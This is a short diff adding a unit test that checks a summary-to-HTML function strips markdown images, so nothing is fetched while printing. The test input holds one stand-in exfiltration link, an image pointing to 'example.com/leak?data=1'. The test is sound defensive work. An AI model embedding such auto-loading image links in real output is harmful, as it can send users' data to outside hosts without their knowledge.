@@ -31,6 +31,12 @@ describe('summaryHtmlDocument', () => {
     expect(html).toContain('<td>Send scope</td>');
     expect(html).toContain('<strong>Summary</strong>');
   });
+
+  test('drops images so nothing is fetched while printing', () => {
+    const html = summaryHtmlDocument('t', 'd', 'Hi ![x](http://example.com/leak?data=1)');
+    expect(html).not.toContain('example.com');
+    expect(html).not.toContain('<img');
+  });
 });
 
 describe('followUpEmailDraft', () => {
